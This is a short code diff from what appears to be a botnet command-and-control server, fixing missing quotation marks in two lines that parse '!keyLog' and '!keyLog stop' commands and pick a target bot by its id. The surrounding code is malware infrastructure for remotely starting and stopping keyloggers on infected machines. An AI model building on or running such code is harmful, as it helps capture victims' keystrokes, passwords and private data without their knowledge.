@@ -244,7 +244,7 @@ def clientHandler(obj):
 			elif ('!keyLog ' in cmd) and ('stop' not in cmd):
 				found = False
 
-				id = cmd.replace(!keyLog ', '')
+				id = cmd.replace('!keyLog ', '')
 				for bot in bot_objects:
 					if str(bot.uid) == id:
 						target_bot = bot
@@ -263,7 +263,7 @@ def clientHandler(obj):
 			elif '!keyLog stop ' in cmd:
 				found = False
 
-				id = cmd.replace(!keyLog stop ', '')
+				id = cmd.replace('!keyLog stop ', '')
 				for bot in bot_objects:
 					if str(bot.uid) == id:
 						target_bot = bot
